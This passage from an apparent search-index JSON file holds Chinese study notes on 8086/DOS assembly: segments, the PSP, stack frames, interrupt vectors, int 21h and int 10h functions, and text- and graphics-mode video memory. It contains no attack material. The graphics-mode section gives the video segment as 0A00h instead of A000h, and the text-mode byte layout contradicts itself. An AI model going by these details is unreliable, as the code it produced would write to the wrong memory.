\u6c47\u7f16\u6307\u793a\u8bed\u53e5 main: ; \u6307\u4ee4\u8bed\u53e5 mov ax , data ; ... mov ds , ax mov ah , 9 mov dx , offset hey int 21 h mov ah , 4 Ch int 21 h code ends ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5 end main ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5","title":"\u6c47\u7f16\u7a0b\u5e8f\u57fa\u672c\u7ed3\u6784"},{"location":"cs/pl/asm/#_35","text":"","title":"\u6bb5\u7684\u5b9a\u4e49\u3001\u5047\u8bbe\u4e0e\u5f15\u7528"},{"location":"cs/pl/asm/#_36","text":"< segmentname > segment [ < align > ] [ < combine > ] [ '< class >' ] < statements > < segmentname > ends \u65b9\u62ec\u53f7\u4e2d\u53ef\u4ee5\u7701\u7565 align\uff1a\u5bf9\u9f50\u65b9\u5f0f\uff0cbyte word dword para page\uff08para \u4e3a 16 \u5b57\u8282\uff0cpage \u4e3a 256 \u5b57\u8282\uff09\u7f3a\u7701\u4e3a para combine\uff1a\u5408\u5e76\u7c7b\u578b\uff0cpublic stack common memory at\uff0cpublic \u4e00\u822c\u7528\u4e8e\u4ee3\u7801\u6bb5\u6570\u636e\u6bb5\uff0cstack \u7528\u4e8e\u5806\u6808\u6bb5 ss \u81ea\u52a8\u521d\u59cb\u5316\u4e3a\u5806\u6808\u6bb5\u7684\u6bb5\u5730\u5740\uff0csp \u81ea\u52a8\u521d\u59cb\u5316\u4e3a\u5806\u6808\u6bb5\u672b\u5c3e\u5b57\u8282\u504f\u79fb\u5730\u5740\u52a0 1 \u4ee3\u7801\u6bb5\u6570\u636e\u6bb5\u53ef\u4ee5\u7701\u7565 public\uff0c\u5806\u6808\u6bb5\u4e0d\u80fd\u7701\u7565 stack 'class'\uff1a\u7c7b\u522b\u540d \u6570\u636e\u6bb5\u5b9a\u4e49\u65f6\u521d\u59cb\u6570\u636e\u4f2a\u6307\u4ee4\u4e3a \u53d8\u91cf\u540d\uff08\u6807\u53f7\u540d\uff09\u3001\u5927\u5c0f\u3001\u5185\u5bb9 \uff0c\u5927\u5c0f\u5373\u4e3a db dw dd \u7b49\u3002\u5982\u679c\u91cd\u590d\u53ef\u4ee5\u7528 \u5927\u5c0f \u5185\u5bb9 dup(\u6b21\u6570) \u7684\u5f62\u5f0f \u5806\u6808\u6bb5\u5b9a\u4e49\u4e00\u822c\u4f7f\u7528\uff1a stk segment stack db 100 h dup ( 0 ) stk ends \u5373\u5f00\u542f\u4e00\u4e2a 100h \u5927\u5c0f\u7684\u5806\u6808","title":"\u6bb5\u5b9a\u4e49"},{"location":"cs/pl/asm/#_37","text":"assume \u7528\u6765\u5efa\u7acb\u6bb5\u5bc4\u5b58\u5668\u4e0e\u6bb5\u7684\u5173\u7cfb\uff0c\u5e2e\u52a9\u6c47\u7f16\u7f16\u8bd1\u7a0b\u5e8f\u8865\u5145\u6bb5\u5730\u5740 \u4e00\u822c\u5199\u4e3a assume cs : code ds : data ss : stk \u7684\u5f62\u5f0f\uff0c\u8fd9\u6837\u89e3\u6790\u53d8\u91cf\u65f6\u5c31\u53ef\u4ee5\u81ea\u52a8\u586b\u5145\u6bb5\u5730\u5740\uff0c\u6bd4\u5982\u4f7f\u7528 mov ah , [ abc ] \u6765\u5f15\u7528 data \u6bb5\u4e2d\u53d8\u91cf abc\uff0cabc \u7684\u6bb5\u5730\u5740\u4e3a data\uff0c\u800c\u901a\u8fc7 assume \u77e5\u9053 data \u5c31\u662f ds\uff0c\u56e0\u6b64\u4f1a\u88ab\u89e3\u91ca\u4e3a mov ah , ds :[...] \u867d\u7136 cs \u548c ss \u4f1a\u81ea\u52a8\u8d4b\u503c\u4e3a\u6bb5\u5730\u5740\uff0c\u4f46 ds \u548c es \u4e0d\u4f1a\uff0c\u9700\u8981\u5728\u4ee3\u7801\u6bb5\u91cc\u624b\u52a8\u4fee\u6539","title":"\u6bb5\u7684\u5047\u8bbe"},{"location":"cs/pl/asm/#_38","text":"\u76f4\u63a5\u5199\u6bb5\u540d\u5c31\u662f\u6bb5\u5730\u5740\u3002\u4f7f\u7528 seg \u53d8\u91cf\u540d \u6216 seg \u6807\u53f7\u540d \u5373\u8868\u793a\u53d8\u91cf/\u6807\u53f7\u6240\u5728\u7684\u6bb5\u5730\u5740","title":"\u6bb5\u7684\u5f15\u7528"},{"location":"cs/pl/asm/#_39","text":"","title":"\u7a0b\u5e8f\u7684\u7ed3\u675f"},{"location":"cs/pl/asm/#_40","text":"\u4f7f\u7528 end \u6307\u4ee4\u7ed3\u675f\uff0c\u683c\u5f0f\u4e3a end \u6807\u53f7\u540d \uff0c\u6307\u5b9a\u7a0b\u5e8f\u4ece\u6807\u53f7\u5904\u5f00\u59cb\u8fd0\u884c","title":"\u6e90\u7a0b\u5e8f\u7684\u7ed3\u675f"},{"location":"cs/pl/asm/#_41","text":"\u7a0b\u5e8f\u6bb5\u524d\u7f00\uff08Program Segment Prefix\uff0cPSP\uff09\u662f\u4e00\u6bb5\u957f\u5ea6\u4e3a 100h \u5b57\u8282\u7684\u5185\u5b58\u3002DOS \u5728\u8fd0\u884c\u7a0b\u5e8f\u65f6\uff0c\u5148\u4e3a\u7a0b\u5e8f\u5206\u914d\u4e00\u4e2a PSP\uff0c\u7136\u540e DOS \u8bfb\u53d6\u6539\u7a0b\u5e8f\u5185\u5bb9\u88c5\u5165 PSP \u540e\u9762\u7684\u5185\u5b58\u4e2d\uff0c\u6700\u540e\u628a ds \u548c es \u8bbe\u7f6e\u4e3a PSP \u6bb5\u5730\u5740\uff0c\u628a ss \u548c sp \u8bbe\u7f6e\u4e3a\u5806\u6808\u6bb5\u6bb5\u5730\u5740\u548c\u5806\u6808\u6bb5\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u504f\u79fb\u5730\u5740\u52a0 1\uff0c\u518d\u628a cs \u8bbe\u7f6e\u4e3a\u4ee3\u7801\u6bb5\u6bb5\u5730\u5740\uff0cip \u8bbe\u7f6e\u4e3a\u6e90\u7a0b\u5e8f\u4e2d end \u6307\u5b9a\u6807\u53f7\u7684\u504f\u79fb\u5730\u5740\uff0c\u7136\u540e\u7a0b\u5e8f\u4ece cs:ip \u5f00\u59cb\u8fd0\u884c PSP \u91cc\u9762\u5b58\u653e\u4e86\u4e0e\u7a0b\u5e8f\u8fd0\u884c\u6709\u5173\u7684\u91cd\u8981\u4fe1\u606f\uff0c\u6bd4\u5982\u547d\u4ee4\u884c\u53c2\u6570\u3001\u73af\u5883\u5757\u6bb5\u5730\u5740\u3001\u7236\u7a0b\u5e8f\u7684 PSP \u6bb5\u5730\u5740\u7b49","title":"\u7a0b\u5e8f\u6bb5\u524d\u7f00"},{"location":"cs/pl/asm/#_42","text":"\u901a\u5e38\u8c03\u7528 21h \u53f7\u4e2d\u65ad\u7684 4C \u53f7\u529f\u80fd\u7ec8\u6b62\uff0c\u5982\uff1a mov ah , 4 Ch mov al , \u8fd4\u56de\u7801 int 21 h","title":"\u7a0b\u5e8f\u7684\u7ec8\u6b62"},{"location":"cs/pl/asm/#_43","text":"\u7a7a\u767d\u4e0d\u654f\u611f \u5e38\u6570\u53ef\u4ee5\u4f7f\u7528\u6574\u578b\u5e38\u6570\u3001\u5b57\u7b26\u5e38\u6570\u3001\u5b57\u7b26\u4e32\u5e38\u6570\uff08\u62c6\u4e3a\u5b57\u7b26\uff09 \u53ef\u4ee5\u4f7f\u7528\u5e38\u6570\u8868\u8fbe\u5f0f\u4f5c\u4e3a\u5e38\u6570\uff0c\u6709 + - * / mod shl shr not and or xor seg offset\uff0c\u5e38\u6570\u8868\u8fbe\u5f0f\u4e2d\u4e0d\u80fd\u51fa\u73b0\u5bc4\u5b58\u5668\u7b49\uff0c\u53ea\u80fd\u662f\u5e38\u6570 \u53ef\u4ee5\u4f7f\u7528 eql \u548c = \u5b9a\u4e49\u7b26\u53f7\u5e38\u6570 = \u7684\u53f3\u4fa7\u53ea\u80fd\u662f\u6570\u503c\u7c7b\u578b\u6216\u5b57\u7b26\u7c7b\u578b\u7684\u5e38\u6570\u6216\u5e38\u6570\u8868\u8fbe\u5f0f\uff0c\u53ef\u4ee5\u5bf9\u540c\u4e00\u7b26\u53f7\u91cd\u65b0\u5b9a\u4e49 eql \u7684\u53f3\u4fa7\u8fd8\u53ef\u4ee5\u662f\u5b57\u7b26\u4e32\u3001\u6c47\u7f16\u8bed\u53e5\uff08 dosint eql < int 21 h > \uff09\uff0c\u4f46\u4e0d\u80fd\u5bf9\u540c\u4e00\u7b26\u53f7\u91cd\u65b0\u5b9a\u4e49 \u53d8\u91cf\u540d\u548c\u6807\u53f7\u540d\u7684\u547d\u540d\uff1a\u53ef\u4ee5\u662f 52 \u4e2a\u5927\u5c0f\u5199\u5b57\u6bcd\u300110 \u4e2a\u6570\u5b57\u3001\u4ee5\u53ca @$?_\uff0c\u6570\u5b57\u4e0d\u80fd\u5f00\u5934\uff0c$ \u4e0e ? \u4e0d\u80fd\u5355\u72ec\u4f7f\u7528\uff0c\u4e00\u822c\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff08\u7f16\u8bd1\u65f6\u52a0\u4e0a /ml \u533a\u5206\u5927\u5c0f\u5199\uff09 \u6807\u53f7\u5b9a\u4e49 \u6807\u53f7\u540d: \u5373\u53ef \u6216\u8005 \u6807\u53f7\u540d label near | far | byte | word | dword near far \u6807\u8bc6\u8fd1\u6807\u53f7\u548c\u8fdc\u6807\u53f7 byte word dword \u6807\u8bc6\u6807\u53f7\u4e3a\u53d8\u91cf \u53d8\u91cf\u7684\u5f15\u7528\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u53d8\u91cf\u540d\u6216\u8005 [\u53d8\u91cf\u540d] \u53ef\u4ee5\u4f7f\u7528 \u53d8\u91cf\u540d[\u504f\u79fb] \u6765\u7c7b\u4f3c\u6570\u7ec4\u5f15\u7528\u503c\uff0c\u4f46\u504f\u79fb\u8bb0\u5f97\u504f\u79fb 1 \u5c31\u662f\u52a0\u4e00\u4e2a\u5b57\u8282\uff0c\u800c\u4e0d\u662f\u4e0b\u4e00\u4e2a\u5143\u7d20","title":"\u6c47\u7f16\u7a0b\u5e8f\u8bed\u53e5"},{"location":"cs/pl/asm/#_44","text":"\u5b50\u7a0b\u5e8f\u53c8\u79f0\u8fc7\u7a0b\uff0c\u5373\u7c7b\u4f3c\u9ad8\u7ea7\u8bed\u8a00\u4e2d\u7684\u51fd\u6570\uff0c\u901a\u8fc7 call \u8c03\u7528 ret \u8fd4\u56de\uff0c\u53ef\u4ee5\u8fd1\u8c03\u7528\u6216\u8fdc\u8c03\u7528\u3002\u8fc7\u7a0b\u7684\u5b9a\u4e49\uff1a < name > proc < attribute > ... < name > endp \u5176\u4e2d attribute \u4e3a near \u6216 far\uff0cnear \u5b9a\u4e49\u8fd1\u8fc7\u7a0b\u4f9b\u8fd1\u8c03\u7528\uff0c\u53ea\u80fd\u5728\u540c\u4e00\u4ee3\u7801\u6bb5\u5185\u8d77\u4f5c\u7528\uff1bfar \u5b9a\u4e49\u8fdc\u8fc7\u7a0b\u4f9b\u8fdc\u8c03\u7528\uff0c\u53ef\u4ee5\u5728\u540c\u4e00\u4ee3\u7801\u6bb5\u6216\u4e0d\u540c\u4ee3\u7801\u6bb5\u5185\u4f7f\u7528 \u5982\u679c\u8fbe\u5230\u51fd\u6570\u7684\u6548\u679c\u4e5f\u53ef\u4ee5\u4e0d\u5b9a\u4e49\u8fc7\u7a0b\uff0c\u53ea\u5b9a\u4e49\u4e00\u4e2a\u6807\u53f7\uff0c\u7136\u540e\u4f7f\u7528 ret / retn \u8fd4\u56de \u8fc7\u7a0b\u4e2d\u8981\u4fdd\u62a4\u67d0\u4e9b\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u6b64\u65f6\u8981\u5728\u8fc7\u7a0b\u5f00\u5934 push \u5165\u5806\u6808\uff0c\u7ed3\u5c3e\u4ece\u5806\u6808 pop \u56de\u6765","title":"\u5b50\u7a0b\u5e8f\u8bbe\u8ba1"},{"location":"cs/pl/asm/#_45","text":"\u4f7f\u7528\u5806\u6808\u4f20\u9012\u53c2\u6570\u6709\u4e09\u79cd\u6807\u51c6\u65b9\u5f0f","title":"\u5806\u6808\u4f20\u9012\u53c2\u6570"},{"location":"cs/pl/asm/#_46","text":"\u6bd4\u5982 c \u8bed\u8a00\u7684\u89c4\u8303\uff0c\u5728\u51fd\u6570\u4e2d\u4f1a\u6709\u52a8\u6001\u5c40\u90e8\u53d8\u91cf\uff0c\u8fd9\u4e9b\u53d8\u91cf\u4f1a\u5b58\u653e\u5728\u5806\u6808\u4e0a\u3002\u51fd\u6570\u5f00\u5934\u5148 push bp \u5b58\u4e0b\u524d\u5e27\u6307\u9488\uff0c\u7136\u540e mov bp, sp \u5c06 bp \u79fb\u52a8\u5230\u6808\u9876\u3002\u4e4b\u540e\u53ef\u4ee5 sub sp, ... \u6765\u5411\u4e0a\u79fb\u52a8 sp \u6307\u9488\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4e3a\u51fd\u6570\u7559\u51fa\u5806\u6808\u4e0a\u7684\u4e00\u90e8\u5206\u7a7a\u95f4\uff0c\u8fd9\u4e9b\u7a7a\u95f4\u88ab\u7528\u6765\u5b58\u653e\u5c40\u90e8\u53d8\u91cf\u3002\u6267\u884c\u8fc7 sub sp, ... \u540e\u7684\u5806\u6808\u7ed3\u6784\u5982\uff1a +-------------+ | | <- sp +-------------+ \\ | | | +-------------+ | | | | +-------------+ |- \u5c40\u90e8\u53d8\u91cf\u7a7a\u95f4 | | | +-------------+ | | | | +-------------+ / | bp | <- bp +-------------+ | return addr | <- \u7531 call \u538b\u5165 +-------------+ | arg0 | <- [bp+4] +-------------+ | arg1 | <- [bp+6] +-------------+ | ... | +-------------+ \u5982\u56fe\u5373\u4e3a\u901a\u8fc7 sub sp, 10 \u5f00\u8f9f\u4e86 10 \u4e2a\u5b57\u8282\u7684\u5c40\u90e8\u53d8\u91cf\u7a7a\u95f4\uff0c\u6b64\u65f6\u518d\u8fdb\u884c push \u548c pop \u64cd\u4f5c\u65f6\u5219\u4f1a\u5411\u4e0a\u589e\u957f\u4e0d\u4f1a\u8986\u76d6\u8be5\u51fd\u6570\u7684\u7a7a\u95f4\u3002 \u53c2\u6570\u548c\u5c40\u90e8\u53d8\u91cf\u4e5f\u90fd\u901a\u8fc7 bp \u6765\u8bbf\u95ee\uff0c\u6bd4\u5982\u53c2\u6570\u4ece [bp+4] \u5f00\u59cb\u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u7136\u540e [bp+6] \u662f\u7b2c\u4e8c\u4e2a\uff0c\u2026\u2026\u3002\u5c40\u90e8\u53d8\u91cf\u90fd\u662f\u901a\u8fc7 [bp-...] \u6765\u8fdb\u884c\u8bbf\u95ee\u7684 \u8fd9\u6837\u7684\u5e27\u6808\u7ed3\u6784\u5728\u51fd\u6570\u9000\u51fa\u65f6\u5148 mov sp, bp\uff0c\u6b64\u65f6 sp \u56de\u843d\u56de bp \u7684\u4f4d\u7f6e\uff0c\u5c40\u90e8\u53d8\u91cf\u5168\u90e8\u5931\u6548\uff0c\u7136\u540e pop bp \u53d6\u51fa\u524d\u5e27\u6307\u9488\uff0c\u518d ret\uff0c\u6b64\u65f6 pop \u51fa\u8fd4\u56de\u5730\u5740\u8fd4\u56de\uff0c\u7136\u540e\u5728\u8c03\u7528\u8005\u5904\u60c5\u51b5\u5806\u6808\u4e2d\u7684\u53c2\u6570 C \u8bed\u8a00\u7684\u51fd\u6570\u91cc bp \u4e0d\u8981\u88ab\u66f4\u6539\uff0c\u540c\u6837\u4e5f\u9700\u8981\u4fdd\u62a4 bx si di \u7684\u503c\uff0c\u4f7f\u5176\u5728\u8c03\u7528\u51fd\u6570\u524d\u540e\u4e0d\u53d8\uff0c\u4e14\u51fd\u6570\u7684\u8fd4\u56de\u503c\u7531 ax \u63d0\u4f9b\uff0c\u6240\u4ee5\u4e00\u822c\u7684\u51fd\u6570\u5199\u6cd5\u5c31\u662f\uff1a f: push bp mov bp , sp sub sp , ... push bx push si push di ... ; [bp+?] \u4e3a\u53c2\u6570 ... ; [bp-?] \u4e3a\u5c40\u90e8\u53d8\u91cf mov ax , ... ; \u8bbe\u7f6e\u8fd4\u56de\u503c pop di pop si pop bx mov sp , bp pop bp ret \u8fd9\u79cd\u5199\u6cd5\u4e0b\u5e27\u6808\u7ed3\u6784\u548c\u5bc4\u5b58\u5668\u90fd\u4e0d\u4f1a\u4e71\u6389\uff0c\u5373\u4f7f\u662f\u8fdb\u884c\u9012\u5f52\u4e5f\u6ca1\u6709\u95ee\u9898","title":"\u52a8\u6001\u53d8\u91cf\u4e0e\u5806\u6808\u7ed3\u6784"},{"location":"cs/pl/asm/#_47","text":"\u4e2d\u65ad\u662f\u5728 CPU \u8fd0\u884c\u671f\u95f4\u9047\u5230\u67d0\u4e9b\u60c5\u51b5\u6682\u65f6\u4e2d\u6b62\u5f53\u524d\u7a0b\u5e8f\uff0c\u53bb\u6267\u884c\u53e6\u4e00\u6bb5\u7279\u6b8a\u5904\u7406\u7a0b\u5e8f\u7684\u8fc7\u7a0b\u3002\u5206\u4e3a\u5185\u90e8\u4e2d\u65ad\u548c\u5916\u90e8\u4e2d\u65ad\uff0c\u5185\u90e8\u4e2d\u65ad\u4e00\u822c\u5c31\u662f\u7531 int \u6307\u4ee4\u6216\u8005 CPU \u7684\u67d0\u4e9b\u9519\u8bef\u6216\u8005\u8c03\u8bd5\u670d\u52a1\u5f15\u8d77\u7684\uff0c\u5916\u90e8\u4e2d\u65ad\u4e00\u822c\u5c31\u662f\u65f6\u949f\u4e2d\u65ad\u3001\u952e\u76d8\u4e2d\u65ad\u7b49 \u4e2d\u65ad\u8c03\u7528\u4e0e\u8fd4\u56de\u5728\u524d\u9762\u6307\u4ee4\u90e8\u5206\u6709\u4ecb\u7ecd","title":"\u4e2d\u65ad"},{"location":"cs/pl/asm/#_48","text":"\u4e2d\u65ad\u5411\u91cf\u5373\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u5165\u53e3\u7684\u5730\u5740\uff0c\u4e3a 4 \u4e2a\u5b57\u8282\uff0c\u524d\u4e24\u4e2a\u5b57\u8282\u4e3a\u504f\u79fb\u5730\u5740\uff0c\u540e\u4e24\u4e2a\u5b57\u8282\u4e3a\u6bb5\u5730\u5740 \u7cfb\u7edf\u4e2d\u4e00\u5171\u6709 256 \u4e2a\u4e2d\u65ad\u53f7\uff0c\u8303\u56f4\u5728 00h \u5230 0FFh\uff0c\u6bb5\u5730\u5740 0000h \u5904\u4e3a\u4e2d\u65ad\u5411\u91cf\u8868\uff0c\u4e2d\u65ad\u5411\u91cf\u7684\u5730\u5740\u4f4d\u4e8e 0000:[4*\u4e2d\u65ad\u53f7]\uff0c\u4f8b\u5982 word ptr 0:[20h] \u5b58\u653e 8h \u65f6\u949f\u4e2d\u65ad\u7684\u504f\u79fb\u5730\u5740\uff0cword ptr 0:[22h] \u5b58\u653e\u65f6\u949f\u4e2d\u65ad\u7684\u6bb5\u5730\u5740","title":"\u4e2d\u65ad\u5411\u91cf"},{"location":"cs/pl/asm/#_49","text":"\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u4ee4 es \u4e3a 0\uff0c\u901a\u8fc7 es:[...] \u7684\u65b9\u5f0f\u6765\u66f4\u6539\u4e2d\u65ad\u5411\u91cf\uff0c\u4f46\u7a0b\u5e8f\u7ed3\u675f\u540e\u5e76\u4e0d\u4f1a\u6539\u56de\u6765\uff0c\u800c\u4ea7\u751f\u9519\u8bef\u3002\u56e0\u6b64\u8981\u5728\u6539\u4e4b\u524d\u5b58\u4e0b\u539f\u6765\u7684\u4e2d\u65ad\u5411\u91cf\uff0c\u7a0b\u5e8f\u7ed3\u675f\u524d\u518d\u6539\u56de\u539f\u6765\u7684\u4e2d\u65ad\u5411\u91cf \u4f8b code segment assume cs : code old_00h dw 0 , 0 int_00h: mov ch , 10 h iret main: push cs pop ds xor ax , ax mov es , ax mov bx , 0 mov ax , es :[ bx ] mov dx , es :[ bx + 2 ] mov old_00h [ 0 ], ax mov old_00h [ 2 ], dx mov word ptr es :[ bx ], offset int_00h mov es :[ bx + 2 ], cs mov ax , 123 h mov ch , 1 div ch mov ax , old_00h [ 0 ] mov dx , old_00h [ 2 ] mov es :[ bx ], ax mov es :[ bx + 2 ], dx mov ah , 4 Ch int 21 h code ends end main","title":"\u66f4\u6539\u4e2d\u65ad\u5411\u91cf"},{"location":"cs/pl/asm/#_50","text":"\u9664\u6cd5\u6ea2\u51fa\u6709\u4e24\u79cd\u60c5\u51b5\uff1a \u9664\u4ee5 0 \u4f1a\u6ea2\u51fa \u5546\u65e0\u6cd5\u4fdd\u5b58\u5230 al \u6216 ax \u4e2d\uff0c\u4f1a\u53d1\u751f\u6ea2\u51fa \u6ea2\u51fa\u7684\u65f6\u5019\u4f1a\u5728 div \u6307\u4ee4\u7684\u524d\u9762\u63d2\u5165\u4e00\u6761 int 00 h \u5e76\u8fd0\u884c\uff0cDOS \u6267\u884c 0 \u53f7\u4e2d\u65ad\u4f1a\u8f93\u51fa\u6ea2\u51fa\u4fe1\u606f\u5e76\u7ec8\u6b62\u7a0b\u5e8f \u56e0\u6b64\u4e5f\u5c31\u53ef\u4ee5\u4fee\u6539 0 \u53f7\u4e2d\u65ad\u7684\u4e2d\u65ad\u5411\u91cf\uff0c\u4f7f\u4e4b\u7ee7\u7eed\u8fd0\u884c\uff0c0 \u53f7\u4e2d\u65ad\u9000\u51fa\u540e\u4ecd\u4f1a\u91cd\u65b0\u8fd0\u884c\u521a\u521a\u51fa\u73b0\u95ee\u9898\u7684 div \u6307\u4ee4\uff0c\u4e00\u4e2a\u4f8b\u5b50\u89c1\u4e0a\uff08\u5373\u4fee\u6539\u4e2d\u65ad\u5411\u91cf\u7684\u90a3\u4e2a\u4f8b\u5b50\uff09","title":"\u9664\u6cd5\u6ea2\u51fa"},{"location":"cs/pl/asm/#_51","text":"","title":"\u65f6\u949f\u5ef6\u8fdf"},{"location":"cs/pl/asm/#dos","text":"DOS \u4e2d\u65ad\u5373\u662f int 21h\uff0c\u5b83\u4f5c\u4e3a\u4e00\u4e2a\u51fd\u6570\u96c6\u5305\u542b\u4e86\u6807\u51c6\u8f93\u5165/\u8f93\u51fa\u3001\u6587\u4ef6\u7ba1\u7406\u3001\u5185\u5b58\u7ba1\u7406\u3001\u8fdb\u7a0b\u7ba1\u7406\u7684\u4e2d\u65ad\u8c03\u7528\uff0c\u63d0\u4f9b\u4e86\u8bf8\u591a\u5b50\u529f\u80fd\uff08ah \u4e3a\u529f\u80fd\u53f7\uff09\uff0c\u5b8c\u6574\u89c1 Ralf Brown's Interrupt List \uff0c\u4e0b\u9762\u662f\u4e00\u4e9b\u5e38\u7528\u529f\u80fd AH=01h \u529f\u80fd \uff1a\u8f93\u5165\u5b57\u7b26\u529f\u80fd \u4f5c\u7528 \uff1a\u4ece\u952e\u76d8\u8bfb\u5165\u5355\u4e2a\u5b57\u7b26\uff0c\u5982\u679c\u662f Ctrl-Break \u5219\u9000\u51fa\uff0c\u5426\u5219\u5c06\u952e\u503c\u9001\u5165 al \u4e2d AH=02h \u529f\u80fd \uff1a\u8f93\u51fa\u5b57\u7b26\u529f\u80fd \u4f5c\u7528 \uff1a\u5c06 dl \u4ee5\u5b57\u7b26\u7684\u5f62\u5f0f\uff08ASCII\uff09\u6253\u5370\u51fa\u6765 AH=09h \u529f\u80fd \uff1a\u8f93\u51fa\u5b57\u7b26\u4e32\u529f\u80fd \u4f5c\u7528 \uff1a\u5c06 ds:dx \u5904\u5b57\u7b26\u4e32\u8f93\u51fa\uff0c\u8be5\u5b57\u7b26\u4e32\u5fc5\u987b\u4ee5 '$' \u7ed3\u5c3e AH=0Ah \u529f\u80fd \uff1a\u8f93\u5165\u5b57\u7b26\u4e32\u529f\u80fd \u4f5c\u7528 \uff1ads:dx \u4e3a\u4e00\u4e2a buf\uff0cbuf \u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u4e3a\u5141\u8bb8\u8f93\u5165\u7684\u6700\u591a\u5b57\u7b26\u6570\uff0c\u4e2d\u65ad\u540e\u7b2c\u4e8c\u4e2a\u5b57\u8282\u53d8\u4e3a\u5b9e\u9645\u8f93\u5165\u7684\u5b57\u7b26\u6570\uff0c\u7b2c\u4e09\u4e2a\u5b57\u8282\u5f00\u59cb\u662f\u8f93\u5165\u7684\u5b57\u7b26\u5185\u5bb9\u3002\u5982\u679c\u8f93\u5165\u8d85\u8fc7\u6700\u5927\u5b57\u7b26\u6570\uff0c\u5219\u4f1a\u53d1\u51fa\u94c3\u58f0\uff0c\u5e76\u4e14\u5149\u6807\u4e0d\u518d\u79fb\u52a8 AH=4Ch \u529f\u80fd \uff1a\u7ec8\u6b62\u7a0b\u5e8f\u529f\u80fd \u4f5c\u7528 \uff1a\u9000\u51fa\u5f53\u524d\u7a0b\u5e8f\uff0c\u8fd4\u56de\u7801\u4e3a al\uff08DOS \u4e2d\u4e0d\u4f1a\u5904\u7406\uff0c\u53ef\u4ee5\u4e0d\u5199\uff09","title":"DOS \u4e2d\u65ad"},{"location":"cs/pl/asm/#bios","text":"int 10h \u7c7b\u578b \uff1a\u89c6\u9891\u4e2d\u65ad \u5b50\u529f\u80fd \uff1aah = 00h \u53f7\u529f\u80fd\u5207\u6362\u663e\u793a\u6a21\u5f0f al = 03h \u8868\u793a 80*25 \u6587\u672c\u6a21\u5f0f al = 13h \u8868\u793a 320*200*256 \u56fe\u5f62\u6a21\u5f0f","title":"BIOS \u4e2d\u65ad"},{"location":"cs/pl/asm/#_52","text":"\u7a0b\u5e8f\u8fd0\u884c\u65f6\u9ed8\u8ba4\u7ec8\u7aef\u5c31\u5904\u4e8e\u6587\u672c\u6a21\u5f0f\uff0c\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u5199\u5165\u76f8\u5e94\u5185\u5b58\u5730\u5740\u6765\u66f4\u6539\u663e\u793a\u6587\u672c\u7684\u5185\u5bb9 \u6574\u4e2a\u6587\u672c\u6a21\u5f0f\u7684\u5c4f\u5e55\u5de6\u4e0a\u89d2\u5750\u6807\u4e3a (0, 0)\uff0c\u53f3\u4e0b\u89d2\u5750\u6807\u4e3a (79, 24)\u3002\u5185\u5b58\u7ed3\u6784\u4e3a\u4e00\u4e2a\u5b57\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\uff08\u9ad8 8 \u4f4d\u4e3a\u663e\u793a\u7684\u5b57\u7b26\uff0c\u4f4e 8 \u4f4d\u4e2d\u9ad8 4 \u4f4d\u4e3a\u80cc\u666f\u8272\uff0c\u4f4e 4 \u4f4d\u4e3a\u524d\u666f\u8272\uff09\uff0c(x, y) \u4f4d\u7f6e\u5904\u7684\u5b57\u7b26\u5bf9\u5e94\u5185\u5b58\u4f4d\u4e8e word ptr B800:[(y*80+x)*2] \u5904 \u7f16\u7a0b\u65f6\u5148\u8bbe\u7f6e es \u4e3a 0B800h\uff0c\u7136\u540e\u8ba1\u7b97\u51fa bx = (y*80+x)*2\uff0c\u7136\u540e\u4ee4 byte ptr es:[bx] = \u5b57\u7b26\uff0cbyte ptr es:[bx+1] = \u989c\u8272","title":"\u6587\u672c\u6a21\u5f0f\u7f16\u7a0b"},{"location":"cs/pl/asm/#_53","text":"\u628a\u663e\u5361\u5207\u6362\u5230\u56fe\u5f62\u6a21\u5f0f\u4f7f\u7528 int 10h \u4e2d\u65ad\uff0c mov ax , 0013 h \u8bbe\u7f6e\u5b50\u529f\u80fd\u53f7\u4e3a 0\uff0c\u6a21\u5f0f\u7f16\u53f7 al \u4e3a 13h \u5373\u56fe\u5f62\u6a21\u5f0f\uff0c\u7136\u540e int 10 h \u5373\u53ef\u5207\u6362\u5230\u56fe\u5f62\u6a21\u5f0f\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u662f 320*200 \u5206\u8fa8\u7387\u3001256 \u8272\u7684\u6a21\u5f0f\u3002 \u5c4f\u5e55\u4e0a\u7684\u4e00\u4e2a\u70b9\u5bf9\u5e94\u663e\u5361\u5185\u5b58\u4e0a\u7684\u4e00\u4e2a\u5b57\u8282\uff0c\u8868\u793a\u989c\u8272\u3002\u70b9 (x, y) \u4f4d\u4e8e\u5185\u5b58 0A00:[320*y+x] \u7684\u4f4d\u7f6e\uff0c\u989c\u8272\uff1a 0 \u9ed1 1 \u84dd 2 \u7eff 3 \u9752 4 \u7ea2 5 \u6d0b\u7ea2 6 \u68d5 7 \u767d 8 \u7070 9 \u4eae\u84dd A \u4eae\u7eff B \u4eae\u9752 C \u4eae\u7ea2 D \u7d2b E \u9ec4 F \u4eae\u767d \u7f16\u7a0b\u65f6\u8bbe\u7f6e es \u4e3a 0A00h\uff0c\u7136\u540e\u5411 byte ptr es:[...] \u4e2d\u5199\u5165\u989c\u8272\u7801\u5373\u53ef\u66f4\u6539\u67d0\u5904\u50cf\u7d20\u70b9\u989c\u8272 \u518d\u4f7f\u7528 mov ax , 0003 h \u540e int 10 h \u5207\u6362\u56de\u6587\u672c\u6a21\u5f0f","title":"\u56fe\u5f62\u6a21\u5f0f\u7f16\u7a0b"},{"location":"cs/pl/asm/#80x86","text":"","title":"80x86 \u589e\u52a0\u6307\u4ee4"},{"location":"cs/pl/asm/#80186","text":"insb 80186 \u6307\u4ee4\u683c\u5f0f \uff1ainsb / rep insb \u6307\u4ee4\u4f5c\u7528 \uff1a(input from port to string) \u7b49\u4ef7\u4e8e in al, dx; mov es:[di], al \u5e76\u79fb\u52a8 di \u6ce8\u610f \uff1adi \u7684\u79fb\u52a8\u4e0e df \u6709\u5173\uff0c\u9884\u5148\u7528 